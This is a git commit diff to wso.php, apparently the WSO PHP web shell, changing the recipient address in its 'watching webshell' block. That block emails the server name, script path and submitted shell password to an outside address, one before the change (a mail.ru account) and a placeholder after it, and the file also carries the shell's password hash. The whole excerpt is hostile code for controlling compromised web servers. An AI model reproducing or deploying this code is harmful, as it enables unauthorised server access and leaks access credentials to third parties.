59023c0b0a1afbb8391d8423c261ac12775e3b4f
Michy Amrane <marseillaisanonymous@gmail.com>
2019-04-18 00:24:15 +0200

    Update wso.php

--- wso.php
+++ wso.php
@@ -1,7 +1,7 @@
 <?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('shadowhacker-287@mail.ru', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
 $▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
